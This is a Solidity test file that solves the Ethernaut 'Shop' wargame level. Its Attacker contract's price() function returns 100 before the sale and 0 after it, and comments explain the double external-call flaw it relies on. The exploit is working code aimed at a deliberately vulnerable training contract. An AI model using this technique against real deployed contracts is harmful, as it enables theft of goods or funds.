// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Shop.sol";
import "src/levels/ShopFactory.sol";

contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Shop(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.price(), 100);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // When we call buy fn it first expects that the caller is a contract with price fn implemented.
        // Then it calls the price fn on msg.sender and expects it to return a number greater than or equal to 100 and
        // it also makes sure that isSold is equal to false

        // Once the condition is satisfied, it calls the price fn again and assign the value returned to the price variable
        // without any validation, this allows us to purchase the item for less than 100 by returning a number less than
        // 100 if it's not being called for the first time.

        // We can't have a flag which tells us whether the fn is being called second time because the price fn is
        // a view fn, so we can't write to a state variable, but we can make use of isSold variable of shop contract
        // which gets updated before the second call to the price fn, allowing us to return any number
        // if isSold is equal to true

        Attacker attacker = new Attacker();
        attacker.attack(level);

        // assert that we have solved the challenge
        assertEq(level.isSold(), true);
        assertEq(level.price(), 0);

        vm.stopPrank();
    }
}

contract Attacker {
    Shop public level;

    function attack(Shop _level) external {
        level = _level;
        _level.buy();
    }

    function price() external view returns (uint256) {
        return level.isSold() ? 0 : 100;
    }
}
